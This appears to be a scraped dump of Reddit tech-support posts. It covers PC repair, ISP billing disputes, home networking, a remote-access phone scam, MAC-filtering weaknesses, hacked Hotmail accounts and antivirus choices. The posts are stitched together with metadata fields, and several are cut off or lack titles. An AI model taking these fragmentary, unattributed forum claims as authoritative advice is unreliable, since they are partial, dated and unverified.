You guys gave me a lot to work with, thanks! After my initial virus scan, one PC had about 6 java exploits It's clean now and I'm doing an additional virus scan. I'm awaiting the connection to drop again and hopefully find out which computer triggered it.

I hope this is the right place to post something like this. If not, I can delete and post elsewhere. Anyway, I'm currently in the process of opening a small computer repair business. I'm hoping for some suggestions and answers to some questions I have. 

First of all, I'm looking for a parts distributor that's cheaper than Newegg, TigerDirect, etc. I've done some research and have found companies like D&amp;H, Ingram Micro, SYNNEX, and Tech Data. Does anyone here have experience with these companies? How are prices compared to other places? If you know of any others please suggest!

Also looking for software licensing vendors.

Part of the business will also be screen repair for laptops, iPhones, etc. Any suggestions for purchasing screens?

I've also been looking for a good point of sales software. Something that can track customers, inventory of parts, etc. 

Lastly, for those in this field of business, would you recommend a contract upon customer PC delivery to protect yourself and business? If so, would you recommend any usable contracts?


My apologies for the lengthy post - Just looking for some additional information. If anyone has any tips, recommendations, or experiences they would like to share, I'd certainly appreciate it. As many of you know, starting a business can be very stressful. I'm looking to be as prepared as possible before starting. Thanks!


Edit: I'm honestly blown away at how helpful everyone has been. I've read every response and have acquired so much information from this post. I'm truly grateful and this will substantially prepare me for my grand opening. If anyone else has an opinion or suggestions, please post! I'll constantly check this post and will take everything to heart. Thanks again!!"	t5_2qioo	True

Bieng a person who play alot of games on my pc I've hard nothing but bad things about the system from the gaming ""community"" but I just really want to know exactly what makes it bad?


Edit: Thanks for the discussion folks, after reading through the comments I've decided to atleast for now stick to Win7 but I'm most likely going to pick up Win 8 and start using it activly in the future.

Overall after what I've seen of Win 8 yet it's an ok OS overall but when i'm thinking about modifing it so that it looks and runs like Win 7 for the most part, I can't help to think that it would be easier to just use Win 7.

Thanks for the help.

How screwed is my computer?		68	9	108	"The title pretty much sums it up, these Indian guys call pretending to be Microsoft, saying they're going to clean up all the issues with my computer. I give them remote access to my computer while they make me believe it's going to be free.

I tell them to stop and that I'm not paying anything, and they tell me that if I don't pay they will ""crush my computer."" He hangs up on me and, before I can exit out of the windows or do anything, he runs another programs called ""trees,"" which then installs and ends with the message that my computer ""will be crushed within one hour."" I'm wondering, is this really going to happen, what I can do to save my computer and what they did. Also, is there any recourse I can seek out on the matter? Thanks in advance for any help you guys can offer.

I had been using a D-Link DIR-505 in repeater mode in order to ensure a connection down here and it had been working alright for the past few months.  


However, a week ago, my landlord changed ISPs and presumably got a new router (Telus, which typically provides the router and modem all in 1 device)  I did a hard reset on my D-Link device and set it up to repeat this new SSID.  I'm running a torrent program in order to see whether I have a connection or not, and I can download and upload fine.  However, when I am browsing (Google Chrome), half the time pages do not load.  I run a ping on Command prompt and I typically have a 50% dropped packet rate, sometimes 0% and sometimes 100%.

Yesterday I was forced to accept new terms of service saying I agree to this billing scheme (I have it noted on record that I begrudgingly accepted those terms as I believe the service is flawed) and I was immediately notified that I was in the redzone, and if my behavior continued I would be charged an extra 20% for my service (10$/50 gig's, and I was 100 gigs over).

I called my ISP (a rather large service provider, also the only one in my area :/) and they said, it looks like you use on average 2-4 gigabytes per day, but then yesterday you used 93 gigabytes.  I tried to convince the customer service rep that I talked to that this was a physical impossibility with the connection I have, but she was convinced I was either sending too many emails, or that I was hacked (nobody in my area knows what computers are pretty much, and there were no suspicious cars parked outside my house yesterday, it wouldve been really obvious).  She kept insisting that they send a technician to my house, which I declined noting that unless he were going to travel back in time he wouldn't be able to do anything with the problem, as it was obviously their monitoring of my service that was faulty.

those 93 gigs were just enough to put me way into the red-zone, and would have conveniently been covered by their highest tier service plan (20 mb/s) which I have no use for!!

I finally got to someone who knew enough to know that 90 gigs of bandwidth use in 1 day was out of the question, and he is ""looking into it"" but I doubt I will hear back from them.

I was wondering 2 things:

what is my best course of action if I notice this anomaly again?

I had shutdown every other set of software (I had created separate account with a stripped startup).  

Now we did have some problems with McAfee blocking the stream without telling us it was doing so.  That was fixed, so I had not even looked at McAfee.  After sending some colorful emails to Adobe, I went back over everything again.  This time, looking at McAfee, I noticed Real-Time Scanning.  I googled it.  WTF!?!  This piece of crap software will scan every packet with out telling you it slowing your connection down.  It has a terrible buffer, so when it over flowed, it would cause Adobe Flash Media Live Encoder to disconnect without telling me.

Needless to say, I have removed this junk software.  I just wish I could send it back to the creators.

EDIT:  Thanks for all the excellent advice!

I should clarify that in my particular case, I don't print photos often enough to justify a laser or high-end system.   I use online services to print batches when needed, but still occasionally want to print one-off snapshots for mailing to relatives or using in throwaway projects.   You could argue that I could just buy the manufacturer's paper since I don't use that much, and that's probably correct.   But I know that someone out there has already done the trial and error to find a cheaper alternative, and would like to leverage their knowledge.

EDIT 2:   In case it's helpful to anyone, I found that Kirkland Glossy Photo paper from Costco ($20 for 100 sheets) works great for everyday photo printing on the Canon MX410.

1321461707.0	meiva	Help make my husband's birthday great: What do I need to wire my whole house for network connectivity?	slidewithme	66	11	59	"Hello tech savvy Redditors!


My husband and I just bought a house, and he REALLY wants to wire the whole shebang so there's a network port in each room.  I'm tech savvy myself, but whereas he's the hardware guy... I'm more software.  Thus, I really need your help.


I want to buy him the supplies he needs to do this for his birthday.  I think he'd be giddy like a school girl in a pony shop to receive it all in one go.


The setup (rooms that need network outlets):

- 4 bedrooms

- 2 living rooms

- 1 dining room

- 1 kitchen

- 2 car garage (he has a workbench where he fixes computers, needs network access there too)

- 2k square foot house, 2 floors



Questions:

* How much cable do I need?  I know it's hard to answer this without knowing the layout of my house, but a general number of feet would be helpful.  We host LAN parties a lot, so extra cable will not go unused.

* Obviously I need a network outlet for each room.  Suggestions on these?  Such as, how many network ports for each outlet, etc.

* What tools might he need?  We have cable crimpers and various sized wire cutters.  I know he'll need a drill to run line through the walls, but what sort of drill bit?  I'm thinking he's going to need a long one to drill holes through studs from the top floor to the bottom floor.

* Cat5, Cat5e, Cat6, CatA?  I don't know the different between these.  What type of cable/outlets should I get?  We have cat5e right now, I do believe.

* What other hardware?  We have our modem, router, 2 switches (they're small, like 6 ports each), and a small 4 port hub collecting dust somewhere.

* **ETA:** Any suggestions on where to buy these things?  I'm looking to get them online since it's usually cheaper than a store, especially places like Lowe's, Home Depot, and Fry's.


Any tips or suggestions from electricians, network admins, contractors (we're putting holes in walls, we're gonna need to patch those!) on what we might need to do this, or techniques on HOW to do it, would be very helpful.  Thank you for helping me make his 29th birthday the best one yet!

Don't give recommendations based on whatever happened to be the flavor of the month years ago when you got your computer.  Do research.  Look up standardized tests.

1292104170.0	ek8bn	TeamViewer is an awesome free (for personal use) software to fix remote computers (not affiliated with the site, just a happy user).	chime	65	17	21	"Things I learnt today:

1. TeamViewer ( http://www.teamviewer.com ) is free and works beautifully, even across slow, high-latency intercontinental networks.

2. Skype has a screen-sharing option that works beautifully. Why they don't add a remote-control feature to that is beyond me.

3. McAfee can bring anything down to its knees. MSE + SpyBot is my preferred solution.

I'm in Florida, my parents are in Kolkata India. My mom's brand new laptop was loaded with so much crapware that it was unusable. Despite having 2GB of RAM and a fast CPU it was crawling. I've used LogMeIn before but it wouldn't install on her laptop. I used Skype's screen-sharing option to see what she was seeing (some error about ""The system cannot find the file specified"") and figured installing some other software would be better.

TeamViewer was a quick/easy download. Once we got TeamViewer working, I took over and for the past 4 hours have been removing crap from her laptop. It is like a brand-new laptop already. TeamViewer doesn't require you to create an account or give out your email. Download software at both ends, enter the remote PC's ID &amp; pin and you're good to go.

In terms of some of these, let me know if you have a license for it (and prove it with a reciept), then I'll leave it in there, otherwise I'd be happy to do a custom build.


If people want, I can make a video of it in action.

It does NOT include things like combofix, but DOES include spybot and malwarebytes and hijack this. in 6 hours I'll make a list of what is and isn't in it.


**EDIT: Here is a little more about it...**
Its x86 based for compatibility. If the necessity arises, I can make a x64 edition.
It requires a VALID windows license. Since I assume you are all good people, please please please make sure you have one and don't get me in trouble

I tried to make it as slim as possible to run on older computers as well. It is WinPE 3.0 based and currently boots up with about 250MB of memory usage.

Here is a list of what it currently has:

* Explorer (shell)
* BS Explorer (shell)
* Shell swapper (comes up with ctrl+alt+del)
* Task Manager
* A basic temp file deletion script for XP and Vista(needs to be updated to clear cache files too)
* A basic drive remapper for 7 machines where the bootloader is treated as C and the main partition is treated as D
* Symantec Endpoint Recovery Tool (REQUIRES A COMMERCIAL LICENCE OF SYMANTEC ENDPOINT PROTECTION)
* Smartmontools for checking smart status' of hard drives
* Bitlocker for viewing encrypted drives
* Windows Calculator
* DX11
* HW PnP
* MMC
* MSI Installer (for installing things temporarily into PE)
* Paint
* MS Photoviewer
* MS Wordpad
* Notepad2
* PENetwork (network configuration tool, needs testing)
* RDC
* MS Visual C++ runtimes
* BGInfo
* Clearlock (replacement for lock screen)
* A functioning control panel and aero theme (I don't know if this modifies settings on C)
* Hijack This 2.04
* Malwarebytes Anti Malware (free version. If you have a license, I can make a build for you to enable the paid features)
* Spybot S&amp;D 1.62
* 7-Zip
* Super Finder XT
* Firefox Portable 4b8
* Opera USB
* a43 file browser
* xCHM (for html help files)
* CPUID HWMon
* Magic Jellybean
* Resolution Changer
* Serviwin (for modifying drivers and startup priorities)
* Sysinternals (Autoruns, Diskmon, Diskview, Filemon, Port Monitor, RamMap, Registry Monitor, TCP View)
* Unknown Devices
* Runscanner (with remote regedit)
* Drivers (Audio, Realtek HD Audio, VMWare ethernet, CardReader, LAN, WLAN, MassStorage, Touchpad and Webcam)
* Technically has Memtest86+ but not sure how you would get to it since of the bootloader required.


To start Endpoint Recovery, there is no link, you have to go to X:\Symantec_NSS and run SERT.exe


EDIT2: Currently making a build without Symantec Endpoint Recovery in it. ETA 1 hour, then I need to upload it.

EDIT3: I decided to include avira, restarting the build so its included.

EDIT4: Avira script was having some issue,  so it was not included but you should be able to download it and install it to the RAM drive thinger... It is uploading to megaupload as we speak

EDIT6: I want to thank everyone for the traffic boost. My host reported a page request jump from 17 on friday to 137,604 requests yesterday.

EDIT7: Due to copyright concerns, Dreamhost has temporarily disabled my domain. Until it gets worked out and they understand that its okay to distribute, its going to stay that way. Once it is, I'll put it back up. In the mean time, please use the torrents and _please seed_

**EDIT7UPDATE: Dreamhost would like a signed copy of a distribution agreement for every piece of software on here which would take longer than if you guys just made it yourself. When I get some time, I'll look into packaging just the script files which download the files for you (so I'm not distributing them). They also took my site off line because the large number of downloads maxed out the 100Mbps line going to that server, so the ISO will remain off of my public space forever. When someone sends me a link for the ISO on their servers, I'll  put it up in the main post. The .torrent files will have to be reuploaded somewhere else for people to download them as well as Dreamhost says ALL torrent activity is prohibited.** Thanks for your understanding"	t5_2qioo	True

1318978911.0	lgtpp	God fucking dammit. Mice made my computer their nest.	polarbear_15	61	14	39	"I just got home from a three month trip to discover my computer housed what was seemingly a whole family of mice. The case was filled with cat food and mouse poop and piss. I also found a few chewed wires, but nothing mission critical, fans mostly. At least that's all I've found.

Well now it won't work. I'm thinking it's a GPU issue, but I'm not sure and I have no real way of troubleshooting. I don't have another GPU or another motherboard to test mine in. I'm not even sure where to start. The GPU is a Radeon HD 4850 512MB. The fan doesn't come on when it boots up and there are two red lights lit up. Does this mean it's dead?

Also, there is no POST beep. Everything seems to start fine, though. The motherboard lights are all lit up and all the fans run, my disc drive runs, etc. I'm thinking I'll just take EVERYTHING apart and start over. I'm fairly sure it's been powered off the whole time I was gone, so I don't think the mouse piss would have shorted it out. Any suggestions?

I can't really afford to buy any new parts any time soon, so I'm hoping I can repair this.

EDIT: I found an old motherboard and tried it out. The GPU works fine. Also good news, the old motherboard, which I thought was dead, works fine. So I guess I have two options now. Try to clean the mouse piss off my motherboard with rubbing alcohol or transfer my CPU/HDD/GPU over to my old motherboard and use that. I'll report back with info.

EDIT NUMBER II: So while disassembling, my CPU came out stuck to the heatsink and all the pins got bent. So now I'm stuck with a broken CPU and a broken motherboard and no money. Excuse me while I cry myself to sleep. Thanks for the help."	t5_2qioo	True
1318441913.0	l9shr	"How can I convince my apartment that MAC filtering on an unencrypted network is not ""secure?"" ISP's response inside (x-post)"	indefinitearticle	60	12	65	"My apartment complex has no wired connections; the only way tenants can connect is through a global WiFi network that uses no encryption, but does filter MAC addresses. There have been several concerned tenants because we need this connection for sensitive reasons (banking, etc).

Our PM e-mailed our ISP and received this response:

&gt;Although when a student clicks on the ""&lt;our network&gt;"" connection is &gt;says ""unsecured network"", it really is secure - in a different way. It is &gt;actually very secure based on the fact that the student must register &gt;his/her mac address for any device they want to authenticate with the &gt;&lt;our network&gt; network.
&gt;
&gt;This form of authentication allows for strong security within a &gt;multifamily environment as no one student can see another student's &gt;connection. E.G. I can see my neighbors wireless connection from my &gt;back porch - it's called ""tishy wireless"" and it is a ""secured"" network &gt;which requires me to enter a security code to actually attach to it. If it &gt;was ""unsecured"", I could just attach to it and possibly hack into his &gt;network. &lt;our network&gt; is different - there is only one network name &gt;and it reads ""unsecured"" as it is open to the Kardon community - yet &gt;there is no password you can enter for ""Jimmy"" to get in ""Johns"" &gt;network - Jim Can't see John - like i Can see my neighbor. John is &gt;secure from Jim as his laptop's mac address must authenticate within &gt;our network server in order to gain access to the network.
&gt;
&gt;Please don't be fooled by the word ""unsecured"" - it's just a default &gt;term that we cannot change within a multi-family environment

I'm especially bothered by how he emphasizes that this is actually ""very secure."" I want to be able to specifically articulate why this is not enough. What would you say in this situation?

**EDIT:** Thanks for all the responses everyone! So I responded to my Property Manager with the following:

This security model is only effective if two assumptions are true: 1. that nobody can see the network users' MAC addresses, and 2. that a random device can't copy the MAC address of another device. Both of these statements are categorically and demonstrably false.

The MAC address of a device connected to the network can be detected easily through a process called ""sniffing."" Sniffing is as old as WiFi and an extremely common tactic. Once a MAC address is detected -- after only a couple seconds -- a device can copy and broadcast it using a process called ""spoofing."" This new device looks identical to the old one and is given access.

The MAC filtering security system is analogous to a bouncer at the door with a list of names. If a guest has a name tag that matches a name on the list, the bouncer lets them in. All an uninvited party has to do is copy the name tag of a guest and they can come right in.

This security model can be broken by amateurs rather quickly. So while the &lt;ISP&gt; representative was correct in that &lt;our network&gt; is not ""unsecured,"" it is secured so poorly that the difference between the two is negligible. "	t5_2qioo	True
1313165775.0	jgveh	Can my landlord really know?	mattfred	53	6	82	"I just moved into a new apartment that came with internet included. I had to sign a whole bunch of agreements about what I would use the internet for (mostly standard I guess - no illegal stuff, etc.). 

One of the clauses was that I couldn't use the internet for gaming. They seem to have effectively blocked steam (steam games and D3 are really all I'm interested in at this point). Is there any way for them to tell if I do anything to get around this? Can they really find out if I'm gaming? Netflix is okay which I imagine uses way more bandwidth, so why do the have this rule?

They also forbid P2P stuff, but does that count legitimate uses of torrents?

tl;dr- Can my landlord actually know what traffic I'm sending and can I change something to get steam to work?

1374636734.0	1ixlib	I normally answer questions here, today I am asking, wtf happend here?	markevens	60	12	54	"So I get a call from a regular client who states she is having trouble with her email.  Pretty normal call, so I head out.  

The problem ended up being her router, and for the life of me I don't understand why.  

For the curious, here was my troubleshooting process:

* Not using email client (assumption #1) 
* I can access her comcast account no prob, cannot open email 
* iexplore.exe -extoff, problem persists
* use other browsers, problem persists
* Check host files, host files untouched. 
* Power drain PC, router, and modem, plug everything back in, problem persists
* normal virus scan, no threats, problem persists. 

At this point client tells me she is able to access email from home, or while using next door business wifi, just not from her work wifi.  

* Connect to next door wifi with laptop, problem doesn't present.  
* Connect directly to modem, problem doesn't present.  
* Connect normally, modem &gt; router &gt; pc, problem persists.  
* Check router for any odd settings (which users wouldn't even know how to change anyway), everything is normal.  
* Update router firmware, problem persists. 
* Reset router to factory defaults, problem persists.  
* I run and get a new router &gt; install &gt; problem resolved.  
* Double check with old router, problem persists.  
* Leave client with new router.  

The weird thing is that no other page seemed to be affected, only her comcast email page (which was the most vital part of her job).  Ping comcast.net no prob, ping mail.comcast.net and everything timed out.  

So /r/techsupport, I'm at a loss.  I fixed it, but I don't understand what went wrong in the first place and its driving me nuts.

I've done a lot of 1st line/2nd line support so I was pretty sure I could figure out his issue. He was having issues with people stealing bandwidth from him. I logged into his DLink router in a browser (192.168.0.1) and went to his current wireless LAN connections. 

Another guy came into the room and pointed at one of the connections and said ""That's a rogue computer stealing from you."" I said to him, ""How would you even know that just by reading a MAC Address and seeing that the host name is 'UNKNOWN'?"" He says ""if the last three sections of the mac address add up to more than 255 then it's not a computer and it's some sort of rogue device stealing connection from you."" 

Now I may be wrong, wouldn't be the first time, but I have a feeling this is completely bullshit. I've never heard of something like this before and networking might not be my strongest suit so I thought I'd get some info from this subreddit. So have any of you heard of this before and is this actually something that can happen? Just to verify his theory I calculated the last 3 digits and they added up to about 477.

I tried to get him to install the application on his XP (yes..xp) machine, but he doesn't want to. Every year around this time he needs me to come by and load his new year tax software updates to the accounting program, he also wants a backup done on a CD.

He calls last night to have me come over to load the new software and then tells me the cd drive is not working to load or do backups. I don't want to Frankenstein this machine.

How should I handle this?

**EDIT**
I sent him an email to start the dialog of replacing that machine and updating the software he is using. Most of hist equipment/PC's are more than a few years old now..

&gt;Client,

&gt;I was thinking about that older computer that you run your accounting software on after our discussion last night.
&gt;
&gt;There are a few things that concern me about that older pc and the software running on it from a hardware and support stand point.
&gt;
&gt;1 . It's running an operating system that was deemed ""end of life"" (meaning no support from microsoft) about 6 years ago. There is hardly any compatible devices (cd-rom) or drivers made for that operating system.
&gt;
&gt;2 . Its going to be expensive to start replacing the hardware as the hardware really isn't available anywhere except for scarce online retailers. You can't buy drives for that type of machine connection at local retailers and the external USB drives won't have drivers for that old of an operating system.
&gt;Sure it maybe will work, but to configure it would be specialized drivers and no support.
&gt;
&gt;This brings me to the software that you are using on that machine. I forgot what it was called, but it is outdated in the sense that it's DOS based, unless they have an updated version that is compatible with at least windows XP(also beyond the end of life for 2 years..) if not windows Vista or 7 or 8 for that matter.
&gt;
&gt;Bottom line is that it's going to be expensive and a waste of your money (as well as increase the time I spend on it) to keep that PC and software supported.
&gt;
&gt;I think it's time you thought of different options like running a newer version of the software  (or change to an up-to-date accounting program) on one of your other PC's or buying a new one.
&gt;
&gt;Also I would consider adding it to your network so that you may backup the files along with the other backup process. It would make things a lot easier to manage and I wouldn't worry about security.
&gt;
&gt;Let me know your thoughts on this.

1357237297.0	15we0g	400-600 Hotmail Emails have been hacked in the past couple of hours!!!	QuivoViscocho	60	15	66	"I work in the tech department of my company and have been recieving many phone calls from coworkers as well as personal friends who have all told me that in the last few hours their accounts have been hacked. When I checked my own personal account it was also hacked.

Most of them get a message telling them that they cannot access their account because someone else is using it and that the password has been changed. Those who went through password recovery checked their security settings only to find that new email accounts had been added to their forwarding, security questions were changed or deleted, and contacts/inbox emails were deleted.

Now I don't know if this is a small scale issue or a wide scale hacking problem hotmail has, but this seems to be large enough to possibly be a security breach for hotmail.

I have tried to contact hotmail and managed to get in contact with the hotmail billing department in which I relayed the info to. So far they do not know about it and simply assumed it was a breach in my company but I told them that even my non coworker friends and relatives have had this happen to them. They said they will take note of it and that's it.

I figure I would post here to see if anyone else has been hacked or has had weird changes on their security options.

Please spread the word to anyone you know who has hotmail accounts and let them know.

EDIT : Yes some people still use hotmail accounts like [FRIENDLY_CANADIAN](http://www.reddit.com/r/techsupport/comments/15we0g/400600_hotmail_emails_have_been_hacked_in_the/c7qnjww) said they still have a large database. Regardless I understand that it is unpopular and I like others strongly recommend switching over to gmail in light of this incident. I love the fact that gmail lets you add spaces to your passwords unlike hotmail.

1295987897.0	f8x15	One of the strangest computer repairs I've done.	Wavern	56	9	48	"So here's the setup. Last Saturday my computer wouldn't boot up. Self-built Core 2 Duo E8500 stock clock and a Gigabyte Motherboard in a CM HAF 932. Power button didn't do anything. Tried all the standard non-invasive things to troubleshoot and nothing.

I unplugged everything and took it to the kitchen table . Tried shorting the power switch pins manually in case it was a bad power button and that didn't work either. Went and bought a new power supply and replaced the power connectors to the motherboard with the new supply. Still nothing. Guess it's something more serious. Time for an upgrade! :D

Went and got a new ASUS P8P67, i5 2500k, and 8 gigs of DDR3. Put it all together in my case, hit the power and it started up. Ahh, bad motherboard and/or cpu I guess? Anyhow I plugged everything in, closed it up and installed it under my desk. It was, however, not an happily ever after story.

On the first bootup I got a message about USB overload and was told that the system would shut down in 15 seconds. I started unplugging usb devices one at a time to pinpoint which one was acting up. Finally it was just the keyboard and still with the message. Unplugged it and... still USB overload....

Then I had a flashback to Saturday. I accidentally stepped on my iphone data cable and heard something snap. I saw a bit of black plastic on the carpet but figured I had snapped it off the bottom of the case. Nope, that was from one of the front USB connectors. I took a loser look and part of it had collapsed which was obviously shorting out the usb port. Once I unplugged the cable connecting that header to the MB, everything was fine.

I've been working on computer for 25+ years and this is definitely in the top 3 of strange and hard to diagnose issues. Now I've got my old motherboard here sitting at work so I can test it out. Hopefully it's fine so I can sell it. (E8500 -&gt; i5 2500k is quite a nice jump, not returning anything).

I'm sure it's not new to a lot of people who do tech support as a profession, but I'm not too proud to admit that I was stumped for about thirty minutes.

I found a virus that acts like it's ""services.exe"" which was not difficult to find and resolve, but at the same time the virus still kept me from using ANY anti-virus programs (be it Malwarebytes or Microsoft Security Essentials or Avast).  I ran a registry fixer to see if it was a registry problem that would solve the lack of AV running.

After much google-ing and work I found that ""Rkill"" fixed my problem effectively and quickly.  I assure this is a legit link for those trying to fix their computers (or those of friends/loved ones) who can't run AV programs.

http://i.imgur.com/sv9ws.png

As you can see, the big issue here is the spacing between words and the dashed lines instead of solid ones

I tried ALT + Drag, Copy &amp; Paste in to columns but I had two problems...

1) The content in column 2 separated each line in to a new row, i need it to separate it where the dashed lines are.

2) The spacing of the text (ADOBE has OCR so it is all recognized as text, not image) is such that the item number (column one) and the word ""special"" from each description in column 2 were stuck together. This is more of a nuisance than a big issue, but it would save a lot of time if i can fix this.

throw away here
A college student who recently survived an apartment fire with major burns over 25% her body...post-surgery and multiple skin grafts later she bravely went back to school, in December my Moose lodge bought a Dell laptop and donated it to her to replace her burnt up MacBook. 

We got her a Dell Inspiron N7010, not quite the MacBook she lost but perfect for a college student to get back to work. The unit came preinstalled with Computrace Lojack for laptops. 


Well her apt got broken into on Thursday night and her and her roommate's laptops were stolen while they were out. No worries as her Dell has Lojack. She spent all day sat filling out police reports and talking to detectives.  

Should be simple call Llojack and have them track the computer right. Or so i thought. Computrace has no record of the computer. So i call dell, dell says they didn't set it up, but they did remember to charge for it.

Dell and Computrace refuse any responsibility, the software is preinstalled but not activated...it doesn’t even pop up in the 'initial setup' dialogs on the first boot...you have to search for the Lojack program in all programs, probably somewhere between wild tangent and dell update utility...

Computrace is very happy to help me register my computer...except it is stolen...dell is very sorry but I’m more than welcome to buy a new dell...

we specifically bought the Dell because it came with Lojack preinstalled...I mean it was going to an off campus college student.

so I ask you as a community what can I do...the computer has signed onto Skype since it was stolen...so the lowlife knows how to use the internet

We’re talking about a 22 year old girl who has survived a fire only to be mocked openly by assholes in public, broken up with by her boyfriend and cast aside by lawyers when looking for some sort of acknowledgement that this shouldn’t have happened to her. Now someone victimizes her again.

This girl is adapting to a new life full of nerve pain medication, anxiety pills, and regular scar management injections. Nothing would give us (her friends and family) greater joy than showing her that the world isn’t out to get her, but  it’s getting more and more difficult to prove.


tldr; burn victim's donated laptop got stolen on St Paddy’s day, Lojack/Computrace can’t help me and neither can Dell...sure glad we bought the Lojack bundle :("	t5_2qioo	True

I have a natural interest in technology and computers, and would like to pursue a career in IT. I am prepared for a stint in the call center doldrums (as they frequently seem to be described) as long as I can keep growing towards a more professional situation eventually, but I want to make sure I don't waste time and money on some hokey computer courses at a community college if they're not going to help me get my foot in the door at a support desk/IT related job. 

I haven't deluded myself into believing I can just get a cert or two and instantly be making piles of cash, but I know that there are a lot of dead ends in the world of ""professional education"" and I want to know I'm spending what little money and time I have on a worthwhile endeavour.

I have looked at the A+ cert, the CCNA (which looks like more of a 'further down the road' pursuit) and a bunch of other stuff and I'm not really sure where to start on this path. 

I suppose a desktop support position would be the place for someone in my position to try to attain first, but without getting a 2 year degree at first, where should I start?

 I know basically nothing about computers. (I'm trying to teach myself but that's another story) Anyway, the older gentleman of this couple approached me and conveyed that he was VERY concerned that his wife cannot use the computer at all. I asked what happened and he said the ""windows crashed"". Thinking that it may be something simple, I went over to the house to take a look. When I sat down I saw the code:

 !!  Oxc0000034  !!402/98287($$system32_en_us_licenses_oem_starter_151...) 

I turned the computer off and then restarted in safe-mode and it went through system 32 files but never actually started up. (""please wait"") was all I got and nothing actually happened.

I finally got into some application where I could see that the motherboard is a ASUS EFI BIOS. (Not sure if that helps) Obviously I couldn't do anything as I have no idea what nay of this means.

All I am asking is if there is anyone who can tell me what this problem may be and how I can point these people in the right direction to get it fixed. 

After their computer is fixed, I swear I'm going to go through and see what they've got on there and make simple ""old people cheat sheets"" for them. Also, I'm going to step up and learn for myself. In the meantime...

HELP!?

1354744750.0	14ch7w	Reddit, what is your consensus regarding the best free Antivirus?	FenrirHowls	55	13	87	"I did a fresh install of Windows 8 on a newly built computer, and I'm now researching AV software.
 
I'm undecided between: avast! Free + MalwareBytes **OR** Microsoft Security Essentials + MalwareBytes

The features most important to me, in rank:

1) Low impact on system performance

2) Malware detection

3) Removal/cleanup of infections

4) Easy to uninstall (i.e. the opposite of Norton)

According to [AV-comparatives](http://www.av-comparatives.org/comparativesreviews/performance-tests), avast and MSE seem to be on equal footing in terms of impact on system performance.

Honestly, it seems like either choice would work well along with malwarebytes for detection. What is your opinion reddit?

Also, I'm also deciding between Firefox or Chrome for my browser. I'm leaning a little toward Firefox at this point because of Chrome's tracking. Of course I'm planning to utilize WOT, adblockPlus, and NoScript to aid in protection.

EDIT: Forgot to add that avast comes with web rep, a sandbox, and file reputation. Does this give it an edge or are there better alternatives (e.g. WOT)?"	t5_2qioo	True

1335855096.0	t17vo	PSA: Post titles and you. Please make your post titles descriptive and related to your problem.	HittingSmoke	50	7	10	"This is an extremely wide spread problem not specific to this subreddit, or even reddit in general. It rears its head on tech support forums across the toobz. **Generic and unhelpful post titles.**

We all browse these types of boards for different reasons. Some of us are looking to learn a thing or two, some show up looking for someone who's had and solved the problem they're dealing with, some people are just trying to be helpful and spread their knowledge, and I'd like to think at least two of you are out there hoping that solving someone's computer woes will get you laid (and I'm rooting for you!).

To those of us that are just browsing to drop in on the occasional problem we might have experience with absolutely hate hate hate to see generic thread titles that don't relate at all to your problem. For example:

If I see a thread title that says, ""Windows and/or Chrome is telling me that I don't have a DNS connection!"" then someone who's expertise is in hardware troubleshooting and knows little about networking can safely move on without wasting their time clicking and reading an entire post. When you title your thread, ""Help me reddit!"" or ""I'm at my wit's end!"" or ""My grandma soiled herself, but that's not important right now. Fix my computer!"" then it's of absolutely no initial help and in fact there are many of us who will just pass up your thread entirely as we skim for posts which we may be helpful on. If you're keeping score, that's less help for **you** and less eyes on your post.

All of this is almost insignificant compared to the value of searching. Reddit's search engine is absolute shit. It's hard enough to find something when it's posted with an abundance of eloquent descriptors. If I'm having data corruption issues and ten other people who've had the same issue named their post ""Help me reddit!"", if I'm lucky enough for them to even show up in search without a proper title, I have to click each and every one and read it in depth instead of saving time by having a list of detailed titles to pick from to find the one that fits my issue best.

So, for your benefit, for our benefit, for the benefit of your grandma being cleaned up in a timely manner, please **please** use descriptive thread titles. It saves the tech folk's time, it gets more relevant eyes on your post and it makes it easier for people to find your post later so they don't have to make a new post and wait for a response.

My parents just called me and told me the following:

* Their computer got a Trojan virus, so they took it into Best Buy (without telling me first; I would've screamed, ""No!"").
* Geek Squad asked, ""Would you like to backup?"" and backed up only the Administrator account, so everything on all the other users got wiped.
* All my stepdad's personal files are gone.
* *They* owe Geek Squad $300.

I don't doubt that Geek Squad will just hide behind the service agreement, which I'm sure covers loss of data due to incompetence as well. Is there any recourse, though? Could Geek Squad admit its mistake and cut them some slack? Could [Recuva](http://www.piriform.com/recuva) work to recover the files?

I haven't seen the machines yet, but I imagine they are running XP, since they are several years old.  I have been volunteered by my wife to help them set up their computer lab.

From the details I've been given, none of this is out of realm of my expertise, but sounds like with 25 machines it could easily eat up quite a bit of my time.

1355784231.0	150nk9	Just found out my company (20 employees) will be switching to an in-house Exchange server, and I'm the most technically inclined person here. Help me prepare...?	boom929	50	8	62	"Basically, I'm concerned that we might be getting in over our heads, but only because I've heard Exchange servers can be difficult without the right know-how. I am NOT familiar with Exchange, though I am familiar with Outlook in general (setting up accounts, changing settings, etc.). I am usually the go-to person for fixing computer issues in the office.

Sometimes I know how to fix the problem but, since I.T. is not my job, I have to tell them to call someone because it's quicker and easier for everyone involved. If it's a simple fix, then I can usually get to it. As with most people, most of my experience is based on being able to intelligently Google the problem and then follow instructions. 

I am more than willing to learn the basics of an Exchange server, and how different it it may be from a normal Outlook account. I just want to make sure to be prepared to tell the bosses that this is something they need to pay someone for if that's the case.

I was originally thinking we would go to a hosted Exchange service (to avoid the hassle of having our own server to manage) but the person that made this decision did so pretty quickly and with zero communication with me (even though they said that I would probably have to help get it set up).

Any help would be appreciated. If I've left out important information let me know.

**Edit for clarification:** 

- **My job is not IT. I work for a small company that has no IT department. I am the one that typically resolves most of the ""why won't this work?"" situations that arise. If I can't fix it, we call in outside support. Often times we call in outside support because I'm too busy doing my ACTUAL job to help fix a computer, or of course because I am not sure how to fix the problem and I stand back so things don't get worse. My bosses are 100% fine with this.** 

- **If this blows up in their face I will not be at fault. I have already proposed Office 365 (briefly) to one of my bosses and he's interested. If they go another route that I have not been involved with it will have nothing to do with me. This in-house Exchange server solution just came up this morning. I am going to tell them I don't recommend it without more knowledge of what it takes to manage a server (something I will make clear I know NOTHING about).**

- **A few years ago we were sold a package from Dell (I believe by a local rep that is now retired). I learned just this afternoon that, apparently, our server SHOULD have been set up as an Exchange server in the beginning, but it was never completely set up. The boss that is suggesting we simply get it set up no doubt is thinking ""We have the server, why not use it?!"" when in reality they don't understand how big of an undertaking that could be.**

